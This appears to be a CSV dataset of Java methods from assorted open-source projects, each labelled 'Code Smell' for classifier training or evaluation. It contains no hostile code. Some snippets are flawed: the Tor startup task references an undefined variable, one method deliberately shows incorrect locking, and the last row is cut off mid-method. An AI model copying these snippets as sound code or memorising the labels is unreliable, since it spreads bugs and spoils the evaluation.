text,label,text_label
"private void applyFilterMatrix(){
  if (outputEntry != null && photoFilterViewTextureView != null && previewContainer.getMeasuredWidth() > 0 && previewContainer.getMeasuredHeight() > 0) {
    Matrix photoFilterStartMatrix=new Matrix();
    photoFilterStartMatrix.reset();
    if (outputEntry.orientation != 0) {
      photoFilterStartMatrix.postRotate(-outputEntry.orientation,previewContainer.getMeasuredWidth() / 2f,previewContainer.getMeasuredHeight() / 2f);
      if (outputEntry.orientation / 90 % 2 == 1) {
        photoFilterStartMatrix.postScale((float)previewContainer.getMeasuredWidth() / previewContainer.getMeasuredHeight(),(float)previewContainer.getMeasuredHeight() / previewContainer.getMeasuredWidth(),previewContainer.getMeasuredWidth() / 2f,previewContainer.getMeasuredHeight() / 2f);
      }
    }
    photoFilterStartMatrix.postScale(1f / previewContainer.getMeasuredWidth() * outputEntry.width,1f / previewContainer.getMeasuredHeight() * outputEntry.height);
    photoFilterStartMatrix.postConcat(outputEntry.matrix);
    photoFilterStartMatrix.postScale((float)previewContainer.getMeasuredWidth() / outputEntry.resultWidth,(float)previewContainer.getMeasuredHeight() / outputEntry.resultHeight);
    photoFilterViewTextureView.setTransform(photoFilterStartMatrix);
    photoFilterViewTextureView.invalidate();
  }
}",1,Code Smell
"private void fillFilterName(){
  if (!creatingNew || !TextUtils.isEmpty(newFilterName) && nameChangedManually) {
    return;
  }
  int flags=newFilterFlags & MessagesController.DIALOG_FILTER_FLAG_ALL_CHATS;
  var result=FolderIconHelper.getEmoticonFromFlags(flags);
  String newName=result.first;
  String newEmoticon=result.second;
  if (newName != null && newName.length() > MAX_NAME_LENGTH) {
    newName="""";
  }
  newFilterName=newName;
  if (folderTagsHeader != null) {
    folderTagsHeader.setPreviewText((newFilterName == null ? """" : newFilterName).toUpperCase(),false);
  }
  newFilterEmoticon=newEmoticon;
  RecyclerView.ViewHolder holder=listView.findViewHolderForAdapterPosition(nameRow);
  if (holder != null) {
    adapter.onViewAttachedToWindow(holder);
  }
}
",1,Code Smell
"/** 
 * Map the  {@link ILoggingEvent} data model onto the {@link LogRecordBuilder}. 
 */
private void mapLoggingEvent(LogRecordBuilder builder,ILoggingEvent loggingEvent,long threadId){
  String message=loggingEvent.getFormattedMessage();
  if (message != null) {
    builder.setBody(message);
  }
  if (supportsInstant && hasInstant(loggingEvent)) {
    setTimestampFromInstant(builder,loggingEvent);
  }
 else {
    long timestamp=loggingEvent.getTimeStamp();
    builder.setTimestamp(timestamp,TimeUnit.MILLISECONDS);
  }
  Level level=loggingEvent.getLevel();
  if (level != null) {
    builder.setSeverity(levelToSeverity(level));
    builder.setSeverityText(level.levelStr);
  }
  AttributesBuilder attributes=Attributes.builder();
  Object throwableProxy=loggingEvent.getThrowableProxy();
  Throwable throwable=null;
  if (throwableProxy instanceof ThrowableProxy) {
    throwable=((ThrowableProxy)throwableProxy).getThrowable();
  }
  if (throwable != null) {
    setThrowable(attributes,throwable);
  }
  captureMdcAttributes(attributes,loggingEvent.getMDCPropertyMap());
  if (captureExperimentalAttributes) {
    attributes.put(THREAD_NAME,loggingEvent.getThreadName());
    if (threadId != -1) {
      attributes.put(THREAD_ID,threadId);
    }
  }
  if (captureCodeAttributes) {
    StackTraceElement[] callerData=loggingEvent.getCallerData();
    if (callerData != null && callerData.length > 0) {
      StackTraceElement firstStackElement=callerData[0];
      String fileName=firstStackElement.getFileName();
      if (fileName != null) {
        attributes.put(CODE_FILEPATH,fileName);
      }
      attributes.put(CODE_NAMESPACE,firstStackElement.getClassName());
      attributes.put(CODE_FUNCTION,firstStackElement.getMethodName());
      int lineNumber=firstStackElement.getLineNumber();
      if (lineNumber > 0) {
        attributes.put(CODE_LINENO,lineNumber);
      }
    }
  }
  if (captureMarkerAttribute) {
    boolean skipLogstashMarkers=supportsLogstashMarkers && captureLogstashAttributes;
    captureMarkerAttribute(attributes,loggingEvent,skipLogstashMarkers);
  }
  if (supportsKeyValuePairs && captureKeyValuePairAttributes) {
    captureKeyValuePairAttributes(attributes,loggingEvent);
  }
  if (captureLoggerContext) {
    captureLoggerContext(attributes,loggingEvent.getLoggerContextVO().getPropertyMap());
  }
  if (captureArguments && loggingEvent.getArgumentArray() != null && loggingEvent.getArgumentArray().length > 0) {
    captureArguments(attributes,loggingEvent.getMessage(),loggingEvent.getArgumentArray());
  }
  if (supportsLogstashMarkers && captureLogstashAttributes) {
    captureLogstashAttributes(attributes,loggingEvent);
  }
  builder.setAllAttributes(attributes.build());
  builder.setContext(Context.current());
}",1,Code Smell
"private void addInstance(@IdRes final int viewId,@NonNull final Scene scene,@NonNull final String tag,@NonNull AnimationOrAnimatorFactory animationOrAnimatorFactory){
  ThreadUtility.checkUIThread();
  if (TextUtils.isEmpty(tag)) {
    throw new IllegalArgumentException(""tag can't be empty"");
  }
  if (scene == this) {
    throw new IllegalArgumentException(""GroupScene can't be added to itself"");
  }
  if (isAdded(scene)) {
    int currentSceneContainerViewId=mGroupSceneManager.findSceneViewId(scene);
    if (currentSceneContainerViewId != viewId) {
      String currentViewIdName=null;
      try {
        currentViewIdName=getResources().getResourceName(currentSceneContainerViewId);
      }
 catch (      Resources.NotFoundException exception) {
        currentViewIdName=String.valueOf(currentSceneContainerViewId);
      }
      throw new IllegalArgumentException(""Scene is already added to another container, viewId "" + currentViewIdName);
    }
    String currentSceneTag=mGroupSceneManager.findSceneTag(scene);
    if (!currentSceneTag.equals(tag)) {
      throw new IllegalArgumentException(""Scene is already added, tag "" + currentSceneTag);
    }
  }
 else {
    Scene previousScene=findSceneByTag(tag);
    if (previousScene != null) {
      throw new IllegalArgumentException(""already have a Scene "" + previousScene.toString() + "" with tag ""+ tag);
    }
  }
  if (scene.getParentScene() != null && scene.getParentScene() != this) {
    throw new IllegalArgumentException(""Scene already has a parent, parent "" + scene.getParentScene());
  }
  if (isSupportRestore() && scene.isSceneRestoreEnabled() && !SceneInstanceUtility.isConstructorMethodSupportRestore(scene)) {
    throw new IllegalArgumentException(""Scene "" + scene.getClass().getName() + "" must be a public class or public static class, ""+ ""and have only one parameterless constructor to be properly recreated from instance state."");
  }
  mGroupSceneManager.add(viewId,scene,tag,animationOrAnimatorFactory);
}
",1,Code Smell
"public static String getSystem(){
  String SYS=null;
  try {
    Properties prop=new Properties();
    prop.load(new FileInputStream(new File(Environment.getRootDirectory(),""build.prop"")));
    if (prop.getProperty(KEY_MIUI_VERSION_CODE,null) != null || prop.getProperty(KEY_MIUI_VERSION_NAME,null) != null || prop.getProperty(KEY_MIUI_INTERNAL_STORAGE,null) != null) {
      SYS=SYS_MIUI;
    }
 else     if (prop.getProperty(KEY_EMUI_API_LEVEL,null) != null || prop.getProperty(KEY_EMUI_VERSION,null) != null || prop.getProperty(KEY_EMUI_CONFIG_HW_SYS_VERSION,null) != null) {
      SYS=SYS_EMUI;
    }
 else     if (getMeizuFlymeOSFlag().toLowerCase().contains(""flyme"")) {
      SYS=SYS_FLYME;
    }
 else     if (!TextUtils.isEmpty(getProp(KEY_VERSION_VIVO))) {
      SYS=SYS_VIVO;
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
    if (Build.MANUFACTURER.equalsIgnoreCase(""HUAWEI"")) {
      SYS=SYS_EMUI;
    }
 else     if (Build.MANUFACTURER.equalsIgnoreCase(""xiaomi"")) {
      SYS=SYS_MIUI;
    }
 else     if (Build.MANUFACTURER.equalsIgnoreCase(""meizu"")) {
      SYS=SYS_FLYME;
    }
 else     if (Build.MANUFACTURER.equalsIgnoreCase(""vivo"")) {
      SYS=SYS_VIVO;
    }
    return SYS;
  }
  return SYS;
}
",1,Code Smell
"@Override public boolean onKeyUp(int keyCode,KeyEvent event){
  if (keyCode == KeyEvent.KEYCODE_MENU) {
    if (!mDragController.isDragging() && !mWorkspace.isSwitchingState() && isInState(NORMAL)) {
      closeOpenViews();
      if (Utilities.isRunningInTestHarness()) {
        Log.d(TestProtocol.PERMANENT_DIAG_TAG,""Opening options popup on key up"");
      }
      showDefaultOptions(-1,-1);
    }
    return true;
  }
  return super.onKeyUp(keyCode,event);
}",1,Code Smell
"/** 
 * There is a problem in Swing, when using scale factors that end on .25 or .75 (e.g. 1.25, 1.75, 2.25, etc) and repainting single components, which may not repaint right and/or bottom 1px edge of component. <p> The component is first painted to an in-memory image, and then that image is copied to the screen. See  {@code javax.swing.RepaintManager.PaintManager#paintDoubleBufferedFPScales()}. <p> There are two clipping rectangles involved when copying the image to the screen: {@code sun.java2d.SunGraphics2D#devClip} and{@code sun.java2d.SunGraphics2D#usrClip}. <p> {@code devClip} is the device clipping in physical pixels.It gets the bounds of the painting component, which is either the passed component, or if it is non-opaque, then the first opaque ancestor of the passed component. It is calculated in  {@code sun.java2d.SunGraphics2D#constrain()} whilegetting a graphics context via  {@link JComponent#getGraphics()}. <p> {@code usrClip} is the user clipping, which is set via {@link Graphics} clipping methods.This is done in  {@code javax.swing.RepaintManager.PaintManager#paintDoubleBufferedFPScales()}. <p> The intersection of  {@code devClip} and {@code usrClip}(computed in  {@code sun.java2d.SunGraphics2D#validateCompClip()}) is used to copy the image to the screen. <p> Unfortunately different scaling/rounding strategies are used to calculate the two clipping rectangles, which is the reason of the issue. <p> {@code devClip} (see {@code sun.java2d.SunGraphics2D#constrain()}): <pre> {@code int devX = (int) (x * scale); int devWidth = Math.round( width * scale )}</pre> {@code usrClip} (see {@code javax.swing.RepaintManager.PaintManager#paintDoubleBufferedFPScales()}): <pre> {@code int usrX = (int) Math.ceil( (x * scale) - 0.5 ); int usrWidth = ((int) Math.ceil( ((x + width) * scale) - 0.5 )) - usrX;}</pre> X/Y coordinates are always rounded down for  {@code devClip}, but rounded up for  {@code usrClip}. Width/height calculation is also different.
 */
private static boolean needsSpecialRepaint(Component c,int x,int y,int width,int height){
  if (!SystemInfo.isJava_9_orLater || !SystemInfo.isWindows)   return false;
  if (width <= 0 || height <= 0 || c == null)   return false;
  int compWidth=c.getWidth();
  int compHeight=c.getHeight();
  if (compWidth <= 0 || compHeight <= 0)   return false;
  if (x + width < compWidth && y + height < compHeight)   return false;
  if (!c.isOpaque()) {
    int x2=x;
    int y2=y;
    for (Component p=c.getParent(); p != null; p=p.getParent()) {
      x2+=p.getX();
      y2+=p.getY();
      if (p.isOpaque()) {
        if (x2 + width < p.getWidth() && y2 + height < p.getHeight())         return false;
        break;
      }
    }
  }
  double scaleFactor=UIScale.getSystemScaleFactor(c.getGraphicsConfiguration());
  double fraction=scaleFactor - (int)scaleFactor;
  if (fraction == 0 || fraction == 0.5)   return false;
  return true;
}",1,Code Smell
"@SuppressWarnings(""SelfAssignment"") private static void paintOutlinedComponentImpl(Graphics2D g,int x,int y,int width,int height,float focusWidth,float focusWidthFraction,float focusInnerWidth,float borderWidth,float arc,Paint focusColor,Paint borderColor,Paint background,boolean scrollPane,double scaleFactor){
  if (scrollPane && scaleFactor != (int)scaleFactor) {
    if (focusWidth > 0) {
      int totalWidth=(int)(focusWidth + borderWidth);
      focusWidth=totalWidth - borderWidth;
    }
 else {
      borderWidth=(int)borderWidth;
    }
  }
  float x1=x + focusWidth;
  float y1=y + focusWidth;
  float w1=width - focusWidth * 2;
  float h1=height - focusWidth * 2;
  if (background != null) {
    g.setPaint(background);
    g.fill(createComponentRectangle(x1,y1,w1,h1,arc));
  }
  if (borderColor != null && borderColor.equals(focusColor)) {
    borderColor=null;
    focusInnerWidth=Math.max(focusInnerWidth,borderWidth);
  }
  float paintedFocusWidth=(focusWidth * focusWidthFraction) + focusInnerWidth;
  if (focusColor != null && paintedFocusWidth != 0) {
    float inset=focusWidth - (focusWidth * focusWidthFraction);
    float x2=x + inset;
    float y2=y + inset;
    float w2=width - (inset * 2);
    float h2=height - (inset * 2);
    float outerArc=arc + (focusWidth * 2);
    float innerArc=arc - (focusInnerWidth * 2);
    if (focusWidth > 0 && arc > 0 && arc < UIScale.scale(10))     outerArc-=UIScale.scale(2f);
    if (focusWidthFraction != 1)     outerArc=arc + ((outerArc - arc) * focusWidthFraction);
    g.setPaint(focusColor);
    paintOutline(g,x2,y2,w2,h2,paintedFocusWidth,outerArc,innerArc);
  }
  if (borderColor != null && borderWidth != 0) {
    g.setPaint(borderColor);
    paintOutline(g,x1,y1,w1,h1,borderWidth,arc);
  }
}",1,Code Smell
"public boolean parse(AvatarExcel avatarExcel){
  MazeSkill skill=null;
  for (  AbilityInfo ability : AbilityList) {
    List<MazeSkillAction> actionList=null;
    if (ability.getName().endsWith(""MazeSkill"")) {
      skill=new MazeSkill(avatarExcel,2);
      avatarExcel.setMazeSkill(skill);
      actionList=skill.getCastActions();
      var excel=GameData.getSummonUnitExcelMap().get((skill.getId() * 10) + 1);
      if (excel != null && !excel.isIsClient() && excel.getInfo() != null) {
        skill.getCastActions().add(new MazeSkillSummonUnit(excel,20));
      }
    }
 else     if (ability.getName().contains(""NormalAtk"")) {
      skill=new MazeSkill(avatarExcel,1);
      avatarExcel.setMazeAttack(skill);
      actionList=skill.getAttackActions();
    }
 else {
      continue;
    }
    for (    TaskInfo task : ability.getOnStart()) {
      parseTask(skill,actionList,task);
    }
  }
  return true;
}",1,Code Smell
"@Override protected Task<Tor> createTask(){
  return new Task<>(){
    private Exception startupException;
    @Override protected Tor call() throws Exception {
      Tor tor=Tor.getDefault();
      if (tor == null) {
        tor=new Tor();
        CallbackTorManager callbackTorManager=tor.getTorManager();
        callbackTorManager.addListener(new TorManagerEvent.Listener(){
          @Override public void managerEventAddressInfo(          @NotNull TorManagerEvent.AddressInfo info){
            if (!info.isNull) {
              try {
                startupLock.lock();
                startupCondition.signalAll();
              }
  finally {
                startupLock.unlock();
              }
            }
          }
        }
);
        callbackTorManager.start(throwable -> {
          if (throwable instanceof Exception) {
            startupException=exception;
          }
 else {
            startupException=new Exception(throwable);
          }
          log.error(""Error"",throwable);
          try {
            startupLock.lock();
            startupCondition.signalAll();
          }
  finally {
            startupLock.unlock();
          }
        }
,success -> {
          log.info(""Tor daemon started successfully"");
        }
);
        try {
          startupLock.lock();
          if (!startupCondition.await(5,TimeUnit.MINUTES)) {
            throw new TorStartupException(""Tor failed to start after 5 minutes, giving up"");
          }
          if (startupException != null) {
            throw startupException;
          }
        }
  finally {
          startupLock.unlock();
        }
      }
      return tor;
    }
  }
;
}",1,Code Smell
"@Override public ErrorCode setGroupManager(String operator,String groupId,int type,List<String> userList,boolean isAdmin){
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  IMap<String,WFCMessage.GroupInfo> mIMap=hzInstance.getMap(GROUPS_MAP);
  WFCMessage.GroupInfo groupInfo=mIMap.get(groupId);
  if (groupInfo == null) {
    return ErrorCode.ERROR_CODE_NOT_EXIST;
  }
  if (!isAdmin && (groupInfo.getType() == ProtoConstants.GroupType.GroupType_Restricted || groupInfo.getType() == ProtoConstants.GroupType.GroupType_Normal) && (groupInfo.getOwner() == null || !groupInfo.getOwner().equals(operator))) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  if (userList.contains(groupInfo.getOwner())) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  long updateDt=System.currentTimeMillis();
  MultiMap<String,WFCMessage.GroupMember> groupMembers=hzInstance.getMultiMap(GROUP_MEMBERS);
  Collection<WFCMessage.GroupMember> members=groupMembers.get(groupId);
  if (members == null || members.size() == 0) {
    members=loadGroupMemberFromDB(hzInstance,groupId);
  }
  for (  WFCMessage.GroupMember member : members) {
    if (userList.contains(member.getMemberId())) {
      groupMembers.remove(groupId,member);
      member=member.toBuilder().setType(type == 0 ? ProtoConstants.GroupMemberType.GroupMemberType_Normal : ProtoConstants.GroupMemberType.GroupMemberType_Manager).setUpdateDt(updateDt).build();
      databaseStore.persistGroupMember(groupId,Arrays.asList(member),false);
      groupMembers.put(groupId,member);
    }
  }
  databaseStore.persistGroupInfo(groupInfo.toBuilder().setUpdateDt(updateDt).setMemberUpdateDt(updateDt).build());
  mIMap.evict(groupId);
  callbackGroupMemberEvent(operator,groupId,userList,ProtoConstants.GroupMemberUpdateEventType.Group_Member_Event_Type_Update,(type == 0 ? ProtoConstants.GroupMemberType.GroupMemberType_Normal : ProtoConstants.GroupMemberType.GroupMemberType_Manager) + """");
  return ErrorCode.ERROR_CODE_SUCCESS;
}",1,Code Smell
"private String emit(String v){
  if (v.contains(delimiter) || v.contains("" "") || v.contains(""\n"")|| v.contains(""\r"")|| v.contains(""\"""")) {
    return ""\"""" + v.replaceAll(""\"""",""\""\"""") + ""\"""";
  }
 else {
    return v;
  }
}
private String emit(int i){
  return emit(String.format(""%d"",i));
}
private String emit(long l){
  return emit(String.format(""%d"",l));
}
private String emit(double d){
  return emit(String.format(""%f"",d));
}
",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void transferPermission(CrmPermissionTransferReqBO transferReqBO){
  CrmPermissionDO oldPermission=permissionMapper.selectByBizTypeAndBizIdByUserId(transferReqBO.getBizType(),transferReqBO.getBizId(),transferReqBO.getUserId());
  String bizTypeName=CrmBizTypeEnum.getNameByType(transferReqBO.getBizType());
  if (oldPermission == null || (!isOwner(oldPermission.getLevel()) && !CrmPermissionUtils.isCrmAdmin())) {
    throw exception(CRM_PERMISSION_DENIED,bizTypeName);
  }
  if (ObjUtil.equal(transferReqBO.getNewOwnerUserId(),oldPermission.getUserId())) {
    throw exception(CRM_PERMISSION_MODEL_TRANSFER_FAIL_OWNER_USER_EXISTS,bizTypeName);
  }
  adminUserApi.validateUserList(Collections.singletonList(transferReqBO.getNewOwnerUserId()));
  List<CrmPermissionDO> permissions=permissionMapper.selectByBizTypeAndBizId(transferReqBO.getBizType(),transferReqBO.getBizId());
  CrmPermissionDO permission=CollUtil.findOne(permissions,item -> ObjUtil.equal(item.getUserId(),transferReqBO.getNewOwnerUserId()));
  if (permission == null) {
    permissionMapper.insert(new CrmPermissionDO().setBizType(transferReqBO.getBizType()).setBizId(transferReqBO.getBizId()).setUserId(transferReqBO.getNewOwnerUserId()).setLevel(CrmPermissionLevelEnum.OWNER.getLevel()));
  }
 else {
    permissionMapper.updateById(new CrmPermissionDO().setId(permission.getId()).setLevel(CrmPermissionLevelEnum.OWNER.getLevel()));
  }
  if (transferReqBO.getOldOwnerPermissionLevel() != null) {
    permissionMapper.updateById(new CrmPermissionDO().setId(oldPermission.getId()).setLevel(transferReqBO.getOldOwnerPermissionLevel()));
  }
 else {
    permissionMapper.deleteById(oldPermission.getId());
  }
}
",1,Code Smell
"/** 
 * Wraps the given object if necessary. <p> If the object is null or , returns  {@link #NULL}. If the object is a {@code JSONArray} or {@code JSONObject}, no wrapping is necessary. If the object is {@code NULL}, no wrapping is necessary. If the object is an array or {@code Collection}, returns an equivalent  {@code JSONArray}. If the object is a {@code Map}, returns an equivalent  {@code JSONObject}. If the object is a primitive wrapper type or  {@code String}, returns the object. Otherwise if the object is from a  {@code java} package, returns the result of {@code toString}. If wrapping fails, returns null.
 * @param o the object to wrap
 * @return the wrapped object
 */
@SuppressWarnings(""rawtypes"") public static Object wrap(Object o){
  if (o == null) {
    return NULL;
  }
  if (o instanceof JSONArray || o instanceof JSONObject) {
    return o;
  }
  if (o.equals(NULL)) {
    return o;
  }
  try {
    if (o instanceof Collection) {
      return new JSONArray((Collection)o);
    }
 else     if (o.getClass().isArray()) {
      return new JSONArray(o);
    }
    if (o instanceof Map) {
      return new JSONObject((Map)o);
    }
    if (o instanceof Boolean || o instanceof Byte || o instanceof Character|| o instanceof Double|| o instanceof Float|| o instanceof Integer|| o instanceof Long|| o instanceof Short|| o instanceof String) {
      return o;
    }
    if (o.getClass().getPackage().getName().startsWith(""java."")) {
      return o.toString();
    }
  }
 catch (  Exception ignored) {
  }
  return null;
}
",1,Code Smell
"public void setDevices(List<Device> devices){
  for (  Device device : devices) {
    MenuItem deviceItem=new MenuItem(device.getModel().toDisplayString());
    if (!device.isNeedsPinSent() && (device.getModel() == WalletModel.TREZOR_1 || device.getModel() == WalletModel.TREZOR_T || device.getModel() == WalletModel.TREZOR_SAFE_3 || device.getModel() == WalletModel.KEEPKEY || device.getModel() == WalletModel.BITBOX_02)) {
      deviceItem=new Menu(device.getModel().toDisplayString());
      MenuItem toggleItem=new MenuItem(""Toggle Passphrase"" + (!device.getModel().externalPassphraseEntry() ? """" : (device.isNeedsPassphraseSent() ? "" Off"" : "" On"")));
      toggleItem.setOnAction(event -> {
        Hwi.TogglePassphraseService togglePassphraseService=new Hwi.TogglePassphraseService(device);
        togglePassphraseService.setOnSucceeded(event1 -> {
          EventManager.get().post(new RequestOpenWalletsEvent());
          if (!device.getModel().externalPassphraseEntry()) {
            AppServices.showAlertDialog(""Reconnect device"",""Reconnect your "" + device.getModel().toDisplayString() + "" to reset the passphrase."",Alert.AlertType.INFORMATION);
          }
        }
);
        togglePassphraseService.setOnFailed(event1 -> {
          AppServices.showErrorDialog(""Error toggling passphrase"",event1.getSource().getException().getMessage());
        }
);
        togglePassphraseService.start();
      }
);
      ((Menu)deviceItem).getItems().add(toggleItem);
    }
    if (device.isNeedsPinSent()) {
      deviceItem.setGraphic(getLockIcon());
    }
 else {
      deviceItem.setGraphic(getLockOpenIcon());
    }
    getItems().add(deviceItem);
  }
}",1,Code Smell
"/** 
 * Parses a hex color in   {@code #RGB},  {@code #RGBA},  {@code #RRGGBB} or {@code #RRGGBBAA}format and returns it as  {@code rgba} integer suitable for {@link java.awt.Color}, which includes alpha component in bits 24-31.
 */
static int parseColorRGBA(String value) throws IllegalArgumentException {
  int len=value.length();
  if ((len != 4 && len != 5 && len != 7 && len != 9) || value.charAt(0) != '#')   throw newInvalidColorException(value);
  int n=0;
  for (int i=1; i < len; i++) {
    char ch=value.charAt(i);
    int digit;
    if (ch >= '0' && ch <= '9')     digit=ch - '0';
 else     if (ch >= 'a' && ch <= 'f')     digit=ch - 'a' + 10;
 else     if (ch >= 'A' && ch <= 'F')     digit=ch - 'A' + 10;
 else     throw newInvalidColorException(value);
    n=(n << 4) | digit;
  }
  if (len <= 5) {
    int n1=n & 0xf000;
    int n2=n & 0xf00;
    int n3=n & 0xf0;
    int n4=n & 0xf;
    n=(n1 << 16) | (n1 << 12) | (n2 << 12)| (n2 << 8)| (n3 << 8)| (n3 << 4)| (n4 << 4)| n4;
  }
  return (len == 4 || len == 7) ? (0xff000000 | n) : (((n >> 8) & 0xffffff) | ((n & 0xff) << 24));
}",1,Code Smell
"@SuppressWarnings(""unchecked"") @Override public boolean equals(Object obj){
  if (obj == null) {
    return false;
  }
 else   if (clazz == null || !clazz.isAssignableFrom(obj.getClass())) {
    return false;
  }
 else   if (obj == this) {
    return true;
  }
 else   if (this.name == null) {
    return ((AzureExpandableStringEnum<T>)obj).name == null;
  }
 else {
    return this.name.equals(((AzureExpandableStringEnum<T>)obj).name);
  }
}
",1,Code Smell
"public void checkAuthlibInjector(){
  SettingJson.Account account=UserManager.getSelectedAccount(mSetting);
  File file=new File(AppManifest.AUTHLIB_INJETOR_JAR);
  if (!file.exists() && account != null && account.type.equals(SettingJson.USER_TYPE_EXTERNAL)) {
    mTipperManager.addTip(TipperManager.createTipBean(mContext,TipperManager.TIPPER_LEVEL_ERROR,mContext.getString(R.string.title_missing_authlib),() -> DialogUtils.createBothChoicesDialog(mContext,mContext.getString(R.string.title_error),mContext.getString(R.string.tips_please_download_authlib_injector),mContext.getString(R.string.title_ok),mContext.getString(R.string.title_cancel),new DialogSupports(){
      @Override public void runWhenPositive(){
        new Request(mContext).requestLastestVersion();
      }
    }
),CHECKER_ID_MISSING_AUTHLIB));
  }
 else {
    mTipperManager.removeTip(CHECKER_ID_MISSING_AUTHLIB);
  }
}
",1,Code Smell
"private void openEventHandler(){
  try {
    int waitTimes=DEFAULT_WAIT_TIMES;
    for (; ; ) {
      if (shutdown || hasSubscriber() || waitTimes <= 0) {
        break;
      }
      try {
        Thread.sleep(SLEEP_1S);
      }
 catch (      InterruptedException e) {
        Thread.currentThread().interrupt();
      }
      waitTimes--;
    }
    for (; ; ) {
      if (shutdown) {
        break;
      }
      final AbstractEvent event=queue.take();
      receiveEvent(event);
      UPDATER.compareAndSet(this,lastEventSequence,Math.max(lastEventSequence,event.sequence()));
    }
  }
 catch (  Throwable ex) {
    log.error(""Event listener exception."",ex);
  }
}",1,Code Smell
"@Nullable private TreeVisitor<Xml,ExecutionContext> upgradeManagedDependency(Xml.Tag tag,ExecutionContext ctx,Xml.Tag t) throws MavenDownloadingException {
  ResolvedManagedDependency managedDependency=findManagedDependency(t);
  if (managedDependency != null) {
    String groupId=managedDependency.getGroupId();
    String artifactId=managedDependency.getArtifactId();
    String version=managedDependency.getVersion();
    if (version != null && !projectArtifacts.contains(new GroupArtifact(groupId,artifactId)) && matchesGlob(groupId,UpgradeDependencyVersion.this.groupId) && matchesGlob(artifactId,UpgradeDependencyVersion.this.artifactId)) {
      return upgradeVersion(ctx,t,managedDependency.getRequested().getVersion(),groupId,artifactId,version);
    }
  }
 else {
    for (    ResolvedManagedDependency dm : getResolutionResult().getPom().getDependencyManagement()) {
      if (dm.getBomGav() != null) {
        String group=getResolutionResult().getPom().getValue(tag.getChildValue(""groupId"").orElse(getResolutionResult().getPom().getGroupId()));
        String artifactId=getResolutionResult().getPom().getValue(tag.getChildValue(""artifactId"").orElse(""""));
        if (!projectArtifacts.contains(new GroupArtifact(group,artifactId))) {
          ResolvedGroupArtifactVersion bom=dm.getBomGav();
          if (Objects.equals(group,bom.getGroupId()) && Objects.equals(artifactId,bom.getArtifactId())) {
            return upgradeVersion(ctx,t,requireNonNull(dm.getRequestedBom()).getVersion(),bom.getGroupId(),bom.getArtifactId(),bom.getVersion());
          }
        }
      }
    }
  }
  return null;
}
",1,Code Smell
"@Transactional(propagation=Propagation.REQUIRES_NEW) public void updateUserCounterWrong(String name,int i){
  List<UserEntity> userList=userRepository.findByName(name);
  if (userList.size() > 0) {
    log.info(""updateUserCounterWrong {} +{}"",name,i);
    if (true) {
      lock.lock();
      userList=userRepository.findByName(name);
      UserEntity user=userList.get(0);
      try {
        Thread.sleep(1000);
        user.setCounter(user.getCounter() + i);
        userRepository.save(user);
      }
 catch (      InterruptedException ignore) {
      }
 finally {
        lock.unlock();
      }
    }
  }
 else {
    userRepository.save(new UserEntity(name,""""));
  }
}",1,Code Smell
"private void expression() throws Exception {
  relationalExpression();
  String currentReturnType=expressionReturnType;
  while (lexer.PeekNextToken().Token.equals(""&"") || lexer.PeekNextToken().Token.equals(""|"")) {
    String relationSymbol=lexer.PeekNextToken().Token;
    lexer.GetNextToken();
    relationalExpression();
    if (!((currentReturnType.equals(""boolean"") && expressionReturnType.equals(""boolean"")) || (currentReturnType.equals(""int"") && expressionReturnType.equals(""int"")))) {
      error(""Error: in class: "" + className + "", two ends of relational expression are not all int, line: ""+ lexer.PeekNextToken().LineNumber);
    }
    if (relationSymbol.equals(""&"")) {
      vmCodeInput(""and\n"");
    }
 else {
      vmCodeInput(""or\n"");
    }
    expressionReturnType=""boolean"";
  }
}
",1,Code Smell
"@Override public void onMentionCharacterInput(String tag){
  if ((tag.equals(TIMMentionEditText.TIM_MENTION_TAG) || tag.equals(TIMMentionEditText.TIM_MENTION_TAG_FULL)) && TUIChatUtils.isGroupChat(mChatLayout.getChatInfo().getType())) {
    if (mOnInputViewListener != null) {
      mOnInputViewListener.onStartGroupMemberSelectActivity();
    }
  }
}
",1,Code Smell
"public boolean mkdirs(String path){
  if (checkAccess(path,OsConstants.F_OK)) {
    return false;
  }
  List<String> parts=new ArrayList<>();
  String parent=path;
  Node<?> parentNode;
  do {
    String filename=Paths.getLastPathSegment(parent);
    parent=Paths.removeLastPathSegment(parent);
    parts.add(filename);
    parentNode=getNode(parent);
  }
 while (parentNode == null && !parent.equals(File.separator));
  if (!checkAccess(parent,OsConstants.W_OK) || parentNode == null || !parentNode.isDirectory()) {
    return false;
  }
  for (int i=parts.size() - 1; i >= 0; --i) {
    parentNode=new Node<>(parentNode,parts.get(i),false);
    parentNode.setDirectory(true);
    Objects.requireNonNull(parentNode.getParent()).addChild(parentNode);
    String fullPath=parentNode.getFullPath();
    addAction(fullPath,new Action(ACTION_CREATE,parentNode));
    invalidate(fullPath);
  }
  return true;
}",1,Code Smell
"public void visitAnyMethodrefConstant(Clazz clazz,AnyMethodrefConstant anyMethodrefConstant){
  Method referencedMethod=(Method)anyMethodrefConstant.referencedMethod;
  for (int index=0; index < referencingPopCount; index++) {
    int stackEntryIndex=referencingPopCount - index - 1;
    TracedStack stackBefore=partialEvaluator.getStackBefore(referencingOffset);
    Value stackEntry=stackBefore.getTop(stackEntryIndex);
    if (stackEntry.computationalType() == Value.TYPE_REFERENCE) {
      if (referencedMethod == null || ParameterEscapeMarker.isParameterEscaping(referencedMethod,index)) {
        markEscapingReferenceValues(referencingOffset,stackEntryIndex);
      }
      if (referencedMethod == null || ParameterEscapeMarker.isParameterModified(referencedMethod,index)) {
        markModifiedReferenceValues(referencingOffset,stackEntryIndex);
      }
    }
  }
  String returnType=ClassUtil.internalMethodReturnType(anyMethodrefConstant.getType(clazz));
  if (referencedMethod == null || ((ClassUtil.isInternalClassType(returnType) || ClassUtil.isInternalArrayType(returnType)) && ParameterEscapeMarker.returnsExternalValues(referencedMethod))) {
    markExternalReferenceValue(referencingOffset);
  }
}",1,Code Smell
"@Override public void onClick(View v){
  String newApi=inputApi.getText().toString().trim();
  if (!newApi.isEmpty() && (newApi.startsWith(""http"") || newApi.startsWith(""clan""))) {
    ArrayList<String> history=Hawk.get(HawkConfig.API_HISTORY,new ArrayList<String>());
    if (!history.contains(newApi))     history.add(0,newApi);
    if (history.size() > 10)     history.remove(10);
    Hawk.put(HawkConfig.API_HISTORY,history);
    listener.onchange(newApi);
    dismiss();
  }
}
@Override public void onClick(View v){
  ArrayList<String> history=Hawk.get(HawkConfig.API_HISTORY,new ArrayList<String>());
